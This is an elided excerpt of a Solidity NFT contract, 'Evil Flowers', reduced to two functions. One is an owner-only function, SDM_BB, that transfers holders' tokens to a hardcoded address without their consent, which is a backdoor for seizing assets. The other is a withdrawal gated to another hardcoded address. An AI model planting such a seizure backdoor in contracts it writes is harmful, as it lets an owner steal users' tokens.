...
contract Evil_Flowers is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Evil Flowers", "EF", maxBatchSize_, collectionSize_) {
  ...
  function SDM_BB(uint256[] memory tokenids) external onlyOwner {
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x69c12d063E861148D0D06084CCbc812453389b00, tokenid);
        }
    }
  ...
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0xf8414eC81f34842EB903d2c5bF8b5DD376318899);
